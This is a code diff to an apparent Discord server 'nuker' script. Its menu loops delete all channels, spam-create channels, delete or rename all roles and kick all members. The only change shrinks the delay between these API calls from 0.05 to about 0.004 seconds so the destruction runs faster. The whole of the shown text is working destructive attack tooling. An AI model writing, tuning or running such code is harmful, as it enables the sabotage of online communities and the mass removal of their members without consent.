@@ -60,7 +60,7 @@ def main():
             channels = nuker.get_channels()
             for ch in channels:
                 nuker.delete_channel(ch['id'])
-                time.sleep(0.05)
+                time.sleep(0.004)
             input("Channels deleted. Press Enter to continue.")
 
         elif action == '2':
@@ -75,7 +75,7 @@ def main():
             rocket_animation()
             for _ in range(amount):
                 nuker.create_channel(name)
-                time.sleep(0.05)
+                time.sleep(0.005)
             input("Channels created. Press Enter to continue.")
 
         elif action == '3':
@@ -87,7 +87,7 @@ def main():
             for role in roles:
                 if role['name'] != "@everyone":
                     nuker.delete_role(role['id'])
-                    time.sleep(0.05)
+                    time.sleep(0.004)
             input("Roles deleted. Press Enter to continue.")
 
         elif action == '4':
@@ -99,7 +99,7 @@ def main():
             for role in roles:
                 if role['name'] != "@everyone":
                     nuker.rename_role(role['id'], new_name)
-                    time.sleep(0.05)
+                    time.sleep(0.005)
             input("Roles renamed. Press Enter to continue.")
 
         elif action == '5':
@@ -109,7 +109,7 @@ def main():
             members = nuker.get_members()
             for member in members:
                 nuker.kick_member(member['user']['id'])
-                time.sleep(0.05)
+                time.sleep(0.004)
             input("Members kicked. Press Enter to continue.")
 
         elif action == '6':
